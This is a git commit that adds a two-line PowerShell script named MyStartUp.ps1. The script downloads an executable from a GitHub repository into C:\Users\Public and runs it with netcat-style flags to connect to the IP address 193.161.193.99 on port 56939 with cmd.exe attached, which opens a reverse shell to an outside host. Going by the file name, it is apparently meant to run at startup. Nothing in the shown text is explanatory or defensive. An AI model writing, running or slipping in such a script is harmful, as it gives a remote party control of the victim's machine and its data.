e87a91d6f7e166b650d3cb00e960263804a773b0
fullcaleta <144293848+fullcaleta@users.noreply.github.com>
2023-11-13 03:55:42 +0100

    Create MyStartUp.ps1

---
+++ MyStartUp.ps1
@@ -0,0 +1,2 @@
+Invoke-WebRequest -Uri https://raw.githubusercontent.com/fullcaleta/dadddos/main/RNM.exe -OutFile C:\Users\Public\RNM.exe
+C:\Users\Public\RNM.exe -nv 193.161.193.99 56939 -e cmd.exe
